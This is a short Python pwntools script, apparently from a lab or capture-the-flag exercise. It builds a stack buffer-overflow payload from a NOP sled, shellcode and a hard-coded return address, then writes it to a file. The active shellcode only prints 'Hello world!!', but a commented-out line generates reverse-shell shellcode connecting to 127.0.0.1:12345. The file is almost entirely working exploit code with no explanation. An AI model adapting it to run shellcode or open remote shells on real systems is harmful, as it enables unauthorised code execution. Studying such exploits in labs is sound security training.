#!/usr/bin/env python3

from pwn import *
 
context.arch='amd64'
context.os='linux'


# Shellcode for reverse shell
#s_code = shellcraft.amd64.linux.connect('127.0.0.1', 12345) + shellcraft.amd64.linux.dupsh('rbp')

# Shellcode for printing "Hello world!!"
s_code = shellcraft.amd64.linux.echo('Hello world!!') + shellcraft.amd64.linux.exit()

log.info("Shellcode ready")
print(s_code)

s_code_asm = asm(s_code)
log.info("Shellcode length: %d bytes" % len(s_code_asm))

# Return address in little endian format
ret_addr = 0x7fffffffbb98 - 1032 + 128
addr = p64(ret_addr, endian='little')
log.info("Return address: %#.16x" % (ret_addr))


# Opcode for the NOP instruction
nop = asm('nop', arch="amd64")


# Writes payload on a file
payload = nop*(1032 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr
log.info("Payload ready")


shellcode_file = "./shellcode_payload"

with open(shellcode_file, "wb") as f:
        f.write(payload)

log.info("Payload saved into %s" % shellcode_file)

